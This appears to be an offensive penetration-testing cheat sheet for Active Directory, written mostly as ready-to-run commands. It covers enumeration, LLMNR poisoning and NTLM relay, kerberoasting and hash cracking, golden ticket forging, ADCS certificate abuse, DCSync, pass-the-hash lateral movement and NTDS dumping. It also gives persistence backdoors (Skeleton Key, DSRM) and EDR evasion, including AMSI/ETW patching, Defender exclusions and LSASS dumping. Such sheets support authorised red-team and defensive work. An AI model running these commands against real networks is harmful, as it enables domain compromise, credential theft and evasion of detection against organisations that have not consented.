# Active Directory

## 1. Unauthenticated foothold

```bash
nxc smb 10.10.10.0/24                       # hostname, domain, signing, SMBv1, OS
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
enum4linux-ng -A 10.10.10.10
nmap -p 88,389,445,636,3268 --script "ldap*,smb*,krb5*" 10.10.10.10

# Null / guest
nxc smb 10.10.10.10 -u '' -p '' --shares --users --groups
rpcclient -U '' -N 10.10.10.10 -c 'enumdomusers'
```

**Pre-auth Windows bugs:** MS17-010 (EternalBlue), Zerologon (CVE-2020-1472), noPac (CVE-2021-42278/42287), PrintNightmare (CVE-2021-34527), PetitPotam/DFSCoerce coercion, SMBGhost (CVE-2020-0796).

## 2. Credential capture & relay

```bash
# Poisoning
responder -I eth0 -wdv
mitm6 -d corp.local

# Relay (SMB signing off, or LDAP/ADCS targets)
impacket-ntlmrelayx -tf relay.txt -smb2support
impacket-ntlmrelayx -t ldap://dc -smb2support --escalate-user user
impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce a machine account to authenticate
coercer coerce -l targets.txt -u user -p pass -d corp.local -t dc.corp.local
python3 PetitPotam.py attacker dc
```

Checks: LLMNR/NBT-NS/mDNS enabled, WPAD, IPv6 preferred, SMB signing, LDAP signing/channel binding, ADCS web enrollment over HTTP, `MachineAccountQuota > 0`.

## 3. Kerberos

```bash
# AS-REP roast (no preauth)
impacket-GetNPUsers corp.local/ -dc-ip dc -usersfile users.txt -no-pass -format hashcat
nxc ldap dc -u user -p pass --asreproast asrep.txt

# Kerberoast
impacket-GetUserSPNs corp.local/user:pass -dc-ip dc -request -outputfile kerb.txt
nxc ldap dc -u user -p pass --kerberoasting kerb.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt     # AS-REP
hashcat -m 13100 kerb.txt wordlist.txt      # TGS-REP

# Request/convert tickets
impacket-getTGT corp.local/user:pass -dc-ip dc
impacket-getST -spn cifs/dc.corp.local -impersonate administrator corp.local/user:pass
export KRB5CCNAME=user.ccache
```

**Delegation**
- Unconstrained: compromise host with `TRUSTED_FOR_DELEGATION`, coerce DC → capture TGT.
- Constrained: `msDS-AllowedToDelegateTo` → S4U2Self + S4U2Proxy.
- RBCD: `msDS-AllowedToActOnBehalfOfOtherIdentity` → need write on target + a machine account (`MachineAccountQuota`) → S4U2Self/Proxy.

**Forged tickets**
- Golden: `krbtgt` hash → any user, any group, 10y.
- Silver: service account hash → service ticket for that SPN.
- Diamond/sapphire: modify a legit TGT's PAC.
```bash
impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain corp.local administrator
impacket-ticketer -aesKey <key> -domain-sid ... -domain corp.local -user-id 500 Administrator
```

## 4. ADCS

```bash
certipy find -u user@corp.local -p pass -dc-ip dc -vulnerable -stdout
certipy req -u user@corp.local -p pass -ca CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip dc
```

| ESC | Condition |
| --- | --- |
| ESC1 | Enrollee supplies subject + client auth EKU + low-priv enrollment |
| ESC2 | Any purpose / no EKU template |
| ESC3 | Enrollment agent template abuse |
| ESC4 | Writable template ACL |
| ESC5 | Writable PKI object (CA, NTAuthCertificates) |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA |
| ESC7 | ManageCA / ManageCertificates rights |
| ESC8 | NTLM relay to HTTP enrollment endpoint |
| ESC9 | No security extension, `CT_FLAG_NO_SECURITY_EXTENSION` |
| ESC10 | Weak certificate mapping (`StrongCertificateBindingEnforcement=0`) |
| ESC11 | Relay to RPC enrollment |
| ESC13 | Issuance policy → group link |
| ESC15 | Application policy in request (CVE-2024-49019) |

Also: `certipy shadow auto` (Shadow Credentials via `msDS-KeyCredentialLink`), PassTheCert with a CA cert.

## 5. ACL abuse

Enumerate with BloodHound (`bloodhound-python -u user -p pass -d corp.local -ns dc -c All`) then work the shortest path.

| Right | Abuse |
| --- | --- |
| GenericAll / GenericWrite (user) | Reset password, set SPN (targeted kerberoast), shadow creds |
| GenericAll (computer) | RBCD, shadow creds |
| GenericAll (group) | Add member |
| WriteDACL | Grant yourself DCSync / FullControl |
| WriteOwner | Take ownership → WriteDACL |
| ForceChangePassword | Reset without knowing old |
| AddMember | Add to privileged group |
| AddKeyCredentialLink | Shadow credentials |
| DCSync (`DS-Replication-Get-Changes*`) | `secretsdump -just-dc` |
| GPO write | Push logon script / scheduled task to linked OU |
| AdminSDHolder write | Persistence across protected groups |
| SID history | Inject extra SIDs into ticket |

```bash
# WriteDACL -> DCSync
impacket-dacledit -action write -rights DCSync -principal attacker -target-dn "DC=corp,DC=local" corp.local/user:pass -dc-ip dc
impacket-secretsdump -just-dc corp.local/user:pass@dc

# Shadow credentials
certipy shadow auto -u user@corp.local -p pass -account target
```

## 6. GPO / SYSVOL / legacy

- `\\dc\SYSVOL\corp.local\Policies\` → `Groups.xml` `cpassword` → `gpp-decrypt`.
- Logon scripts with creds, `Netlogon` share.
- LAPS: readable `ms-Mcs-AdmPwd` attribute if ACL misconfigured.
- gMSA: `msDS-ManagedPassword` readable by allowed principals.
- Unattend.xml, `sysprep.inf`, `web.config`, `applicationHost.config` on shares.
- ADIDNS: `adidnsdump -u user -p pass dc` → wildcard DNS hijack.

## 7. Lateral movement

```bash
# With creds / hashes
nxc smb targets.txt -u user -H <nthash> -x whoami
nxc winrm targets.txt -u user -p pass -x whoami
impacket-psexec corp.local/user:pass@host
impacket-wmiexec corp.local/user:pass@host
impacket-smbexec corp.local/user:pass@host
impacket-atexec corp.local/user:pass@host 'whoami'
evil-winrm -i host -u user -H <nthash>
xfreerdp /v:host /u:user /pth:<nthash>

# Pass-the-ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/admin@host
```

## 8. Domain takeover & persistence

```bash
impacket-secretsdump -just-dc-ntlm corp.local/da:pass@dc      # NTDS
impacket-secretsdump -sam -system -security LOCAL             # local hive
nxc smb dc -u da -p pass --ntds
```

After DA: dump `krbtgt` (twice, for golden ticket after reset), trust keys (`trustedDomain` objects), SID history across trusts, DSRM password, ADCS CA private key, Azure AD Connect (`MSOL_*` account has DCSync), Seamless SSO `AZUREADSSOACC$` (forge silver ticket → Azure), GPO persistence, AdminSDHolder, Skeleton Key, DSRM backdoor, SID History injection.

## 9. Hybrid / Entra ID

- AAD Connect server: `MSOL_*` creds in config → DCSync; `ADSync` database.
- Seamless SSO: extract `AZUREADSSOACC$` hash → forge Kerberos ticket for `aadg.windows.net` → PRT.
- PRT theft on joined hosts; `roadrecon`, `aadinternals`.
- Token theft: browser cookie/token extraction, `Primary Refresh Token`.
- App registrations: over-permissioned Graph scopes, consent phishing, credential add.

## 10. EDR notes

- AMSI/ETW patching before running .NET tooling.
- Prefer signed binaries, LOLBAS, and in-memory execution over dropped EXEs.
- Defender: check exclusions, `MpPreference`, ASR rules; `Add-MpPreference -ExclusionPath`.
- Constrained Language Mode: check `$ExecutionContext.SessionState.LanguageMode`; bypass via `InstallUtil`, `MSBuild`, custom runspace.
- LSASS: `RunAsPPL` / Credential Guard → prefer `nanodump`, `PPLdump`, or dump from a process with handles; or use `sekurlsa::minidump`.

## 11. Quick triage order

1. SMB signing + null session + shares.
2. Users/groups enumeration, password policy → spray.
3. AS-REP roast, then kerberoast.
4. BloodHound collection and shortest path.
5. ADCS `find -vulnerable`.
6. Relay if signing off; coercion if not.
7. Local admin reuse across hosts → `nxc smb --local-auth`.
